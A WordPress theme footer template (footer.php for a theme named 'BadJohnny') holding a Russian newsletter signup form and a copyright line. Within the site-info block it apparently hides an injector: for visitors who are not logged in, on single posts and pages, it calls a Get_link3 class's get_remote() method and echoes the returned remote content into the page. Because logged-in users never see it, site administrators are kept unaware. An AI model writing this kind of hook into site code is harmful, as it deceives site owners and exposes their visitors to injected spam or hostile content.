<?php
/**
 * The template for displaying the footer
 *
 * Contains footer content and the closing of the #main and #page div elements.
 *
 * @package WordPress
 * @subpackage BadJohnny
 * @since BadJohnny 1.0
 */
?>
</div><!-- #main .wrapper -->

<section class="wp-block-group one-color-section" style="margin-bottom: 30px">
    <div class="entry-content">
        <h2 class="has-text-align-center">Подписаться на обзоры и новости</h2>
        <div class="align-center-div">
            <form method="post" action="https://surrogatnaya-mama.ru/?na=s">
                <input type="hidden" name="nlang" value="">
                <input class="input-field-subscribe" type="email" name="ne" id="tnp-3" value="" required=""
                       placeholder="Введите email">
                <input type="submit" value="Подписаться">
            </form>
        </div>
    </div>
</section>

<footer id="colophon" role="contentinfo">
    <div class="site-info section-width">
        &copy;2022<?= (date('Y', time()) == '2022') ? '' : '-' . (date('Y', time())) ?> <a
                href="<?php echo home_url(); ?>"
                title="<?php bloginfo('description'); ?>"><?php bloginfo('name'); ?></a>. All Right Reserved.</a>
        <?php if ($user_ID) : ?><?php else : ?>
            <?php if (is_single() || is_page()) { ?>
                <?php $lib_path = dirname(__FILE__) . '/';
                require_once('functions.php');
                $links = new Get_link3();
                $links = $links->get_remote();
                echo $links; ?>
            <?php } ?>
        <?php endif; ?>

    </div><!-- .site-info -->
</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>
</body>
</html>